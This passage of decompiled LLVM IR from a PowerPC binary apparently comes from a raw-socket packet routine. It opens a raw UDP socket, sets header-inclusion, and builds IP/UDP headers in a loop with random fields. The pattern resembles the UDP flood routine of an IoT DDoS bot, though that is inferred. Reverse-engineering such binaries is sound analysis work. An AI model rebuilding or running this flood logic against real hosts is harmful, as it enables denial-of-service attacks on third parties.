  br label %dec_label_pc_10005034.outer

dec_label_pc_10005034.outer:                      ; preds = %dec_label_pc_10005068, %dec_label_pc_100051a0, %dec_label_pc_10005030
  %v1_10005034.ph39 = phi i1 [ %v1_10005034.pre, %dec_label_pc_10005030 ], [ %v1_100051a0, %dec_label_pc_100051a0 ], [ %v1_10005068, %dec_label_pc_10005068 ]
  %v0_10005034.ph40 = phi i1 [ %v0_10005034.pre, %dec_label_pc_10005030 ], [ %v0_100051a0, %dec_label_pc_100051a0 ], [ %v0_10005068, %dec_label_pc_10005068 ]
  %v2_10005034 = or i1 %v1_10005034.ph39, %v0_10005034.ph40
  br label %dec_label_pc_10005034

dec_label_pc_10005034:                            ; preds = %dec_label_pc_10005034.outer, %dec_label_pc_10005034
  br i1 %v2_10005034, label %dec_label_pc_10005034, label %dec_label_pc_10005038

dec_label_pc_10005038:                            ; preds = %dec_label_pc_100051a0, %dec_label_pc_10005068, %dec_label_pc_10005034
  %v0_10005038 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005038, label %dec_label_pc_1000503c, label %dec_label_pc_10005164

dec_label_pc_1000503c:                            ; preds = %dec_label_pc_10005038
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005044

dec_label_pc_10005044:                            ; preds = %dec_label_pc_10005044.dec_label_pc_10005044_crit_edge, %dec_label_pc_1000503c
  %v0_10005048 = phi i32 [ %v0_10005060, %dec_label_pc_10005044.dec_label_pc_10005044_crit_edge ], [ 0, %dec_label_pc_1000503c ]
  %v0_10005058 = phi i32 [ %v0_10005044.pre, %dec_label_pc_10005044.dec_label_pc_10005044_crit_edge ], [ 0, %dec_label_pc_1000503c ]
  %v1_10005044 = load i32, i32* %r26.global-to-local, align 4
  %v2_10005044 = add i32 %v1_10005044, %v0_10005058
  %v3_10005044 = inttoptr i32 %v2_10005044 to i32*
  %v4_10005044 = load i32, i32* %v3_10005044, align 4
  store i32 %v4_10005044, i32* %r3.global-to-local, align 4
  %v1_10005048 = add i32 %v0_10005048, 1
  store i32 %v1_10005048, i32* %r28.global-to-local, align 4
  %v1_1000504c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000504c = add i32 %v1_1000504c, %v0_10005058
  %v3_1000504c = inttoptr i32 %v2_1000504c to i32*
  %v4_1000504c = load i32, i32* %v3_1000504c, align 4
  %v0_10005050 = load i32, i32* @r31, align 4
  %v1_10005058 = add i32 %v0_10005058, 4
  store i32 %v1_10005058, i32* %r29.global-to-local, align 4
  store i32 268456032, i32* @lr, align 4
  %v4_1000505c = call i32 @function_1000c108(i32 %v4_10005044, i32 %v4_1000504c, i32 %v0_10005050, i32 16384)
  store i32 %v4_1000505c, i32* %r3.global-to-local, align 4
  %v0_10005060 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005060 = load i32, i32* @r30, align 4
  %v4_10005060 = icmp eq i32 %v0_10005060, %v1_10005060
  br i1 %v4_10005060, label %dec_label_pc_10005068, label %dec_label_pc_10005044.dec_label_pc_10005044_crit_edge

dec_label_pc_10005044.dec_label_pc_10005044_crit_edge: ; preds = %dec_label_pc_10005044
  %v0_10005044.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005044

dec_label_pc_10005068:                            ; preds = %dec_label_pc_10005044
  %v0_10005068 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10005068 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10005068 = or i1 %v0_10005068, %v1_10005068
  br i1 %v2_10005068, label %dec_label_pc_10005034.outer, label %dec_label_pc_10005038

dec_label_pc_10005088:                            ; preds = %dec_label_pc_100050ec, %dec_label_pc_10005108
  %v0_10005088 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005088 = load i32, i32* %r26.global-to-local, align 4
  %v2_10005088 = add i32 %v1_10005088, %v0_10005088
  %v3_10005088 = inttoptr i32 %v2_10005088 to i32*
  %v4_10005088 = load i32, i32* %v3_10005088, align 4
  store i32 %v4_10005088, i32* @r3, align 4
  %v1_10005094 = add i32 %v0_10005088, 4
  store i32 %v1_10005094, i32* %r25.global-to-local, align 4
  store i32 268456092, i32* @lr, align 4
  %v0_10005098 = call i32 @function_1000bfbc()
  store i32 %v0_10005098, i32* %r3.global-to-local, align 4
  %v0_1000509c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000509c = load i32, i32* @r30, align 4
  %v4_1000509c = icmp eq i32 %v0_1000509c, %v1_1000509c
  %v0_100050a0 = load i32, i32* @r28, align 4
  %v1_100050a0 = add i32 %v0_100050a0, 24
  store i32 %v1_100050a0, i32* @r28, align 4
  br i1 %v4_1000509c, label %dec_label_pc_10005030, label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10004f78, %dec_label_pc_10005088
  %v0_100050b4 = phi i32 [ %v0_1000509c, %dec_label_pc_10005088 ], [ 0, %dec_label_pc_10004f78 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_100050b4 = add i32 %v0_100050b4, 1
  store i32 %v1_100050b4, i32* %r24.global-to-local, align 4
  store i32 268456124, i32* @lr, align 4
  %v2_100050b8 = call i32 @function_1000c548(i32 65535, i32 1)
  store i32 %v2_100050b8, i32* %r3.global-to-local, align 4
  %v1_100050bc = load i32, i32* %r25.global-to-local, align 4
  %v2_100050bc = load i32, i32* %r27.global-to-local, align 4
  %v3_100050bc = add i32 %v2_100050bc, %v1_100050bc
  %v4_100050bc = inttoptr i32 %v3_100050bc to i32*
  store i32 %v2_100050b8, i32* %v4_100050bc, align 4
  %v0_100050c0 = call i32 @function_10007ca8()
  %v1_100050c0 = trunc i32 %v0_100050c0 to i16
  %v3_100050c4 = load i32, i32* @r28, align 4
  %v4_100050c4 = add i32 %v3_100050c4, 2
  %v5_100050c4 = inttoptr i32 %v4_100050c4 to i16*
  store i16 %v1_100050c0, i16* %v5_100050c4, align 2
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268456152, i32* @lr, align 4
  %v3_100050d4 = call i32 @function_1000c1bc(i32 2, i32 2, i32 0)
  store i32 %v3_100050d4, i32* %r3.global-to-local, align 4
  %v3_100050dc = icmp eq i32 %v3_100050d4, -1
  %v1_100050e4 = load i32, i32* %r25.global-to-local, align 4
  %v2_100050e4 = load i32, i32* %r26.global-to-local, align 4
  %v3_100050e4 = add i32 %v2_100050e4, %v1_100050e4
  %v4_100050e4 = inttoptr i32 %v3_100050e4 to i32*
  store i32 %v3_100050d4, i32* %v4_100050e4, align 4
  br i1 %v3_100050dc, label %dec_label_pc_1000510c, label %dec_label_pc_100050ec

dec_label_pc_100050ec:                            ; preds = %dec_label_pc_100050a8
  %v0_100050ec = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_100050ec, i32* %stack_var_-72, align 4
  store i32 268456188, i32* @lr, align 4
  %v0_100050f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100050f8 = call i32 @function_1000bf88(i32 %v0_100050f8, i32 %v2_100050d8, i32 16)
  store i32 %v3_100050f8, i32* %r3.global-to-local, align 4
  %v0_100050fc = load i32, i32* @r28, align 4
  %v1_100050fc = add i32 %v0_100050fc, 20
  %v2_100050fc = inttoptr i32 %v1_100050fc to i8*
  %v3_100050fc = load i8, i8* %v2_100050fc, align 1
  %v2_10005100 = icmp ugt i8 %v3_100050fc, 31
  br i1 %v2_10005100, label %dec_label_pc_10005088, label %dec_label_pc_10005108

dec_label_pc_10005108:                            ; preds = %dec_label_pc_100050ec
  %v1_10005070 = add i32 %v0_100050fc, 16
  %v2_10005070 = inttoptr i32 %v1_10005070 to i32*
  %v3_10005070 = load i32, i32* %v2_10005070, align 4
  store i32 %v3_10005070, i32* %r29.global-to-local, align 4
  %v0_10005074 = call i32 @function_10007ca8()
  store i32 %v0_10005074, i32* %r3.global-to-local, align 4
  %v0_10005078 = load i32, i32* @r28, align 4
  %v1_10005078 = add i32 %v0_10005078, 20
  %v2_10005078 = inttoptr i32 %v1_10005078 to i8*
  %v3_10005078 = load i8, i8* %v2_10005078, align 1
  %tmp43 = urem i8 %v3_10005078, 64
  %v2_1000507c = zext i8 %tmp43 to i32
  %v3_1000507c = lshr i32 %v0_10005074, %v2_1000507c
  %v0_10005080 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005080 = add i32 %v3_1000507c, %v0_10005080
  store i32 %v2_10005080, i32* %r3.global-to-local, align 4
  %v2_10005084 = add i32 %v0_10005078, 4
  %v3_10005084 = inttoptr i32 %v2_10005084 to i32*
  store i32 %v2_10005080, i32* %v3_10005084, align 4
  br label %dec_label_pc_10005088

dec_label_pc_1000510c:                            ; preds = %dec_label_pc_10004f9c, %dec_label_pc_100050a8
  %v1_10005120 = call %0 @__asm_mtcrf(i32 24, i32 %v0_10004e78)
  store i32 %v0_10004ea4, i32* %r28.global-to-local, align 4
  store i32 %v0_10004eac, i32* %r29.global-to-local, align 4
  %v0_10005154 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10005154

dec_label_pc_10005158:                            ; preds = %dec_label_pc_10004e70
  %v0_10005158 = call i32 @function_10007ca8()
  store i32 %v0_10005158, i32* %r3.global-to-local, align 4
  %v1_1000515c = urem i32 %v0_10005158, 65536
  store i32 %v1_1000515c, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_10004f70

dec_label_pc_10005164:                            ; preds = %dec_label_pc_10005038
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000516c

dec_label_pc_1000516c:                            ; preds = %dec_label_pc_1000516c.dec_label_pc_1000516c_crit_edge, %dec_label_pc_10005164
  %v0_10005174 = phi i32 [ %v0_10005198, %dec_label_pc_1000516c.dec_label_pc_1000516c_crit_edge ], [ 0, %dec_label_pc_10005164 ]
  %v0_1000516c = phi i32 [ %v0_1000516c.pre, %dec_label_pc_1000516c.dec_label_pc_1000516c_crit_edge ], [ 0, %dec_label_pc_10005164 ]
  %v1_1000516c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000516c = add i32 %v1_1000516c, %v0_1000516c
  %v3_1000516c = inttoptr i32 %v2_1000516c to i32*
  %v4_1000516c = load i32, i32* %v3_1000516c, align 4
  store i32 %v4_1000516c, i32* @r29, align 4
  %v0_10005170 = load i32, i32* @r31, align 4
  store i32 %v0_10005170, i32* @r4, align 4
  %v1_10005174 = add i32 %v0_10005174, 1
  store i32 %v1_10005174, i32* %r25.global-to-local, align 4
  store i32 %v4_1000516c, i32* @r3, align 4
  %v0_1000517c = call i32 @function_10007ed4()
  store i32 %v0_1000517c, i32* %r3.global-to-local, align 4
  %v0_10005180 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005180 = load i32, i32* %r26.global-to-local, align 4
  %v2_10005180 = add i32 %v1_10005180, %v0_10005180
  %v3_10005180 = inttoptr i32 %v2_10005180 to i32*
  %v4_10005180 = load i32, i32* %v3_10005180, align 4
  store i32 %v4_10005180, i32* %r3.global-to-local, align 4
  %v0_10005184 = load i32, i32* @r29, align 4
  %v0_10005188 = load i32, i32* @r31, align 4
  %v1_10005190 = add i32 %v0_10005180, 4
  store i32 %v1_10005190, i32* %r28.global-to-local, align 4
  store i32 268456344, i32* @lr, align 4
  %v4_10005194 = call i32 @function_1000c108(i32 %v4_10005180, i32 %v0_10005184, i32 %v0_10005188, i32 16384)
  store i32 %v4_10005194, i32* %r3.global-to-local, align 4
  %v0_10005198 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005198 = load i32, i32* @r30, align 4
  %v4_10005198 = icmp eq i32 %v0_10005198, %v1_10005198
  br i1 %v4_10005198, label %dec_label_pc_100051a0, label %dec_label_pc_1000516c.dec_label_pc_1000516c_crit_edge

dec_label_pc_1000516c.dec_label_pc_1000516c_crit_edge: ; preds = %dec_label_pc_1000516c
  %v0_1000516c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000516c

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_1000516c
  %v0_100051a0 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100051a0 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100051a0 = or i1 %v0_100051a0, %v1_100051a0
  br i1 %v2_100051a0, label %dec_label_pc_10005034.outer, label %dec_label_pc_10005038

; uselistorder directives
  uselistorder i1 %v1_100051a0, { 1, 0 }
  uselistorder i1 %v0_100051a0, { 1, 0 }
  uselistorder i32 %v0_10005198, { 1, 0 }
  uselistorder i32 %v0_10005180, { 1, 0 }
  uselistorder i32 %v0_10005088, { 1, 0 }
  uselistorder i1 %v1_10005068, { 1, 0 }
  uselistorder i1 %v0_10005068, { 1, 0 }
  uselistorder i32 %v0_10005060, { 1, 0 }
  uselistorder i32 %v0_10005058, { 2, 0, 1 }
  uselistorder i32 %v0_10005024, { 1, 0 }
  uselistorder i32 %v0_10005010, { 1, 0 }
  uselistorder i32 %v2_100050d8, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 23, 7, 8, 10, 11, 12, 13, 14, 15, 9, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 2, 27, 28, 29, 30, 31, 1, 0 }
  uselistorder i32* %r26.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r25.global-to-local, { 0, 1, 2, 6, 7, 3, 5, 4, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r21.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 31, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000510c, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
  uselistorder label %dec_label_pc_10005088, { 1, 0 }
  uselistorder label %dec_label_pc_10005034, { 1, 0 }
  uselistorder label %dec_label_pc_10005034.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005030, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005010, { 1, 0 }
  uselistorder label %dec_label_pc_10004f9c, { 1, 0 }
  uselistorder label %dec_label_pc_10004f70, { 1, 0 }
}

define i32 @function_100051a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100051a8:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100051ac = load i32, i32* @lr, align 4
  store i32 %v0_100051ac, i32* %r0.global-to-local, align 4
  %v0_100051b0 = call i32 @__asm_mfcr()
  store i32 %v0_100051b0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r27.global-to-local, align 4
  %v0_100051c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100051b0, i32* %r19.global-to-local, align 4
  %v0_100051f4 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100051fc = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10005204 = load i32, i32* @r30, align 4
  %v0_10005208 = load i32, i32* @r31, align 4
  store i32 268456476, i32* @lr, align 4
  %v2_10005218 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10005218, i32* %r20.global-to-local, align 4
  %v0_10005220 = load i32, i32* @r28, align 4
  %v0_1000522c = load i32, i32* @r29, align 4
  store i32 %v0_1000522c, i32* %r3.global-to-local, align 4
  store i32 268456500, i32* @lr, align 4
  %v4_10005230 = inttoptr i32 %v0_10005220 to i32*
  %v5_10005230 = call i32 @function_1000235c(i32 %v0_1000522c, i32* %v4_10005230, i32 2, i32 0)
  %v0_10005240 = load i32, i32* @r28, align 4
  %v1_10005244 = urem i32 %v5_10005230, 256
  store i32 %v1_10005244, i32* %r15.global-to-local, align 4
  %v0_10005248 = load i32, i32* @r29, align 4
  store i32 %v0_10005248, i32* %r3.global-to-local, align 4
  store i32 268456528, i32* @lr, align 4
  %v4_1000524c = inttoptr i32 %v0_10005240 to i32*
  %v5_1000524c = call i32 @function_1000235c(i32 %v0_10005248, i32* %v4_1000524c, i32 3, i32 65535)
  %v0_10005250 = load i32, i32* @r28, align 4
  store i32 %v5_1000524c, i32* %r23.global-to-local, align 4
  %v0_10005260 = load i32, i32* @r29, align 4
  store i32 %v0_10005260, i32* %r3.global-to-local, align 4
  store i32 268456552, i32* @lr, align 4
  %v4_10005264 = inttoptr i32 %v0_10005250 to i32*
  %v5_10005264 = call i32 @function_1000235c(i32 %v0_10005260, i32* %v4_10005264, i32 4, i32 64)
  %v0_10005268 = load i32, i32* @r28, align 4
  %v1_10005274 = urem i32 %v5_10005264, 256
  store i32 %v1_10005274, i32* %r16.global-to-local, align 4
  %v0_10005278 = load i32, i32* @r29, align 4
  store i32 %v0_10005278, i32* %r3.global-to-local, align 4
  store i32 268456576, i32* @lr, align 4
  %v4_1000527c = inttoptr i32 %v0_10005268 to i32*
  %v5_1000527c = call i32 @function_1000235c(i32 %v0_10005278, i32* %v4_1000527c, i32 5, i32 0)
  %v0_1000528c = load i32, i32* @r28, align 4
  %v1_10005290 = urem i32 %v5_1000527c, 256
  store i32 %v1_10005290, i32* @r31, align 4
  %v0_10005294 = load i32, i32* @r29, align 4
  store i32 %v0_10005294, i32* %r3.global-to-local, align 4
  store i32 268456604, i32* @lr, align 4
  %v4_10005298 = inttoptr i32 %v0_1000528c to i32*
  %v5_10005298 = call i32 @function_1000235c(i32 %v0_10005294, i32* %v4_10005298, i32 6, i32 65535)
  %v0_100052a0 = load i32, i32* @r28, align 4
  store i32 %v5_10005298, i32* %r24.global-to-local, align 4
  %v0_100052b0 = load i32, i32* @r29, align 4
  store i32 %v0_100052b0, i32* %r3.global-to-local, align 4
  store i32 268456632, i32* @lr, align 4
  %v4_100052b4 = inttoptr i32 %v0_100052a0 to i32*
  %v5_100052b4 = call i32 @function_1000235c(i32 %v0_100052b0, i32* %v4_100052b4, i32 7, i32 65535)
  %v0_100052b8 = load i32, i32* @r28, align 4
  store i32 %v5_100052b4, i32* %r25.global-to-local, align 4
  %v0_100052c8 = load i32, i32* @r29, align 4
  store i32 %v0_100052c8, i32* %r3.global-to-local, align 4
  store i32 268456656, i32* @lr, align 4
  %v4_100052cc = inttoptr i32 %v0_100052b8 to i32*
  %v5_100052cc = call i32 @function_1000235c(i32 %v0_100052c8, i32* %v4_100052cc, i32 0, i32 512)
  %v0_100052d0 = load i32, i32* @r28, align 4
  store i32 %v5_100052cc, i32* %r26.global-to-local, align 4
  %v0_100052e0 = load i32, i32* @r29, align 4
  store i32 %v0_100052e0, i32* %r3.global-to-local, align 4
  store i32 268456680, i32* @lr, align 4
  %v4_100052e4 = inttoptr i32 %v0_100052d0 to i32*
  %v5_100052e4 = call i32 @function_1000235c(i32 %v0_100052e0, i32* %v4_100052e4, i32 1, i32 1)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100052ec = load i32, i32* @global_var_1001eb10.71, align 4
  %v0_100052f0 = load i32, i32* @r28, align 4
  %v1_100052f8 = urem i32 %v5_100052e4, 256
  store i32 %v1_100052f8, i32* %r17.global-to-local, align 4
  %v0_100052fc = load i32, i32* @r29, align 4
  store i32 %v0_100052fc, i32* %r3.global-to-local, align 4
  store i32 268456708, i32* @lr, align 4
  %v4_10005300 = inttoptr i32 %v0_100052f0 to i32*
  %v5_10005300 = call i32 @function_1000235c(i32 %v0_100052fc, i32* %v4_10005300, i32 25, i32 %v3_100052ec)
  store i32 %v5_10005300, i32* %r30.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268456728, i32* @lr, align 4
  %v3_10005314 = call i32 @function_1000c1bc(i32 2, i32 3, i32 17)
  store i32 %v3_10005314, i32* %r3.global-to-local, align 4
  %v3_10005318 = icmp eq i32 %v3_10005314, -1
  store i32 %v3_10005314, i32* %r21.global-to-local, align 4
  br i1 %v3_10005318, label %dec_label_pc_10005574, label %dec_label_pc_10005324

dec_label_pc_10005324:                            ; preds = %dec_label_pc_100051a8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10005330 = ptrtoint i32* %stack_var_-104 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268456768, i32* @lr, align 4
  %v5_1000533c = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_10005330, i32 4, i32 4)
  store i32 %v5_1000533c, i32* %r3.global-to-local, align 4
  %v3_10005340 = icmp eq i32 %v5_1000533c, -1
  br i1 %v3_10005340, label %dec_label_pc_1000556c, label %dec_label_pc_10005348

dec_label_pc_10005348:                            ; preds = %dec_label_pc_10005324
  %v0_10005348 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005348 = urem i32 %v0_10005348, 65536
  store i32 %v1_10005348, i32* %r18.global-to-local, align 4
  %v0_1000534c = load i32, i32* %r23.global-to-local, align 4
  %v1_1000534c = urem i32 %v0_1000534c, 65536
  store i32 %v1_1000534c, i32* %r22.global-to-local, align 4
  %v0_10005354 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005354 = urem i32 %v0_10005354, 65536
  store i32 %v1_10005354, i32* %r23.global-to-local, align 4
  %v0_10005358 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005358 = urem i32 %v0_10005358, 65536
  store i32 %v1_10005358, i32* %r24.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10005348, 1461
  br i1 %tmp30, label %dec_label_pc_10005364, label %dec_label_pc_10005360

dec_label_pc_10005360:                            ; preds = %dec_label_pc_10005348
  store i32 1460, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10005364

dec_label_pc_10005364:                            ; preds = %dec_label_pc_10005348, %dec_label_pc_10005360
  %v0_10005674 = phi i32 [ %v1_10005348, %dec_label_pc_10005348 ], [ 1460, %dec_label_pc_10005360 ]
  %v0_10005364 = load i32, i32* %r19.global-to-local, align 4
  %v1_10005364 = icmp slt i32 %v0_10005364, 0
  %v3_10005364 = icmp eq i32 %v0_10005364, 0
  store i1 %v1_10005364, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10005364, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %tmp31 = icmp slt i32 %v0_10005364, 1
  br i1 %tmp31, label %dec_label_pc_1000566c, label %dec_label_pc_10005374

dec_label_pc_10005374:                            ; preds = %dec_label_pc_10005364
  %v0_10005374 = load i32, i32* @r31, align 4
  %v3_10005374 = icmp eq i32 %v0_10005374, 0
  %v1_10005378 = add nuw nsw i32 %v0_10005674, 28
  store i32 %v1_10005378, i32* %r25.global-to-local, align 4
  %v1_1000537c = add nuw nsw i32 %v0_10005674, 8
  store i32 %v1_1000537c, i32* %r26.global-to-local, align 4
  %v1_10005380 = urem i32 %v1_10005378, 65536
  store i32 %v1_10005380, i32* @r28, align 4
  %v1_10005384 = urem i32 %v1_1000537c, 65536
  store i32 %v1_10005384, i32* @r29, align 4
  br i1 %v3_10005374, label %dec_label_pc_1000538c, label %dec_label_pc_100055d4

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_10005374
  br label %dec_label_pc_10005390

dec_label_pc_10005390:                            ; preds = %dec_label_pc_10005390, %dec_label_pc_1000538c
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268456860, i32* @lr, align 4
  %v2_10005398 = call i32 @function_1000c548(i32 1510, i32 1)
  store i32 %v2_10005398, i32* %r3.global-to-local, align 4
  %v3_1000539c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1000539c, i32* %r9.global-to-local, align 4
  %v0_100053a0 = load i32, i32* @r31, align 4
  %v1_100053a0 = mul i32 %v0_100053a0, 4
  store i32 %v1_100053a0, i32* %r0.global-to-local, align 4
  %v1_100053a4 = load i32, i32* %r20.global-to-local, align 4
  %v3_100053a4 = add i32 %v1_100053a4, %v1_100053a0
  %v4_100053a4 = inttoptr i32 %v3_100053a4 to i32*
  store i32 %v2_10005398, i32* %v4_100053a4, align 4
  %v0_100053a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100053a8 = mul i32 %v0_100053a8, 4
  store i32 %v1_100053a8, i32* %r9.global-to-local, align 4
  %v1_100053ac = load i32, i32* %r20.global-to-local, align 4
  %v2_100053ac = add i32 %v1_100053ac, %v1_100053a8
  %v3_100053ac = inttoptr i32 %v2_100053ac to i32*
  %v4_100053ac = load i32, i32* %v3_100053ac, align 4
  store i32 %v4_100053ac, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_100053b4 = inttoptr i32 %v4_100053ac to i32*
  %v2_100053b4 = load i32, i32* %v1_100053b4, align 4
  store i32 %v2_100053b4, i32* %r0.global-to-local, align 4
  %v1_100053b8 = add i32 %v4_100053ac, 20
  store i32 %v1_100053b8, i32* %r10.global-to-local, align 4
  %v0_100053bc = load i32, i32* %r16.global-to-local, align 4
  %v1_100053bc = trunc i32 %v0_100053bc to i8
  %v3_100053bc = add i32 %v4_100053ac, 8
  %v4_100053bc = inttoptr i32 %v3_100053bc to i8*
  store i8 %v1_100053bc, i8* %v4_100053bc, align 1
  %v1_100053c0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100053c0, i32* %r0.global-to-local, align 4
  %v0_100053c4 = load i32, i32* @r30, align 4
  %v1_100053c4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100053c4 = add i32 %v1_100053c4, 12
  %v3_100053c4 = inttoptr i32 %v2_100053c4 to i32*
  store i32 %v0_100053c4, i32* %v3_100053c4, align 4
  %v1_100053c8 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v0_100053cc = load i32, i32* %r22.global-to-local, align 4
  %v1_100053cc = trunc i32 %v0_100053cc to i16
  %v2_100053cc = load i32, i32* %r11.global-to-local, align 4
  %v3_100053cc = add i32 %v2_100053cc, 4
  %v4_100053cc = inttoptr i32 %v3_100053cc to i16*
  store i16 %v1_100053cc, i16* %v4_100053cc, align 2
  %v1_100053d0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100053d0 = inttoptr i32 %v1_100053d0 to i32*
  store i32 %v1_100053c8, i32* %v2_100053d0, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_100053d8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100053d8 = add i32 %v2_100053d8, 9
  %v4_100053d8 = inttoptr i32 %v3_100053d8 to i8*
  store i8 17, i8* %v4_100053d8, align 1
  %v0_100053dc = load i32, i32* %r15.global-to-local, align 4
  %v1_100053dc = trunc i32 %v0_100053dc to i8
  %v2_100053dc = load i32, i32* %r11.global-to-local, align 4
  %v3_100053dc = add i32 %v2_100053dc, 1
  %v4_100053dc = inttoptr i32 %v3_100053dc to i8*
  store i8 %v1_100053dc, i8* %v4_100053dc, align 1
  %v0_100053e0 = load i32, i32* @r28, align 4
  %v1_100053e0 = trunc i32 %v0_100053e0 to i16
  %v2_100053e0 = load i32, i32* %r11.global-to-local, align 4
  %v3_100053e0 = add i32 %v2_100053e0, 2
  %v4_100053e0 = inttoptr i32 %v3_100053e0 to i16*
  store i16 %v1_100053e0, i16* %v4_100053e0, align 2
  %v3_100053e4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_100053e4, i32* %r9.global-to-local, align 4
  %v0_100053e8 = load i32, i32* %r23.global-to-local, align 4
  %v1_100053e8 = trunc i32 %v0_100053e8 to i16
  %v2_100053e8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100053e8 = add i32 %v2_100053e8, 20
  %v4_100053e8 = inttoptr i32 %v3_100053e8 to i16*
  store i16 %v1_100053e8, i16* %v4_100053e8, align 2
  %v0_100053ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100053ec = add i32 %v0_100053ec, 1
  store i32 %v1_100053ec, i32* %r31.global-to-local, align 4
  %v1_100053f0 = mul i32 %v0_100053ec, 24
  store i32 %v1_100053f0, i32* %r9.global-to-local, align 4
  %v1_100053f4 = load i32, i32* %r19.global-to-local, align 4
  %v2_100053f4 = icmp slt i32 %v1_100053ec, %v1_100053f4
  %v0_100053f8 = load i32, i32* @r29, align 4
  %v1_100053f8 = trunc i32 %v0_100053f8 to i16
  %v2_100053f8 = load i32, i32* %r10.global-to-local, align 4
  %v3_100053f8 = add i32 %v2_100053f8, 4
  %v4_100053f8 = inttoptr i32 %v3_100053f8 to i16*
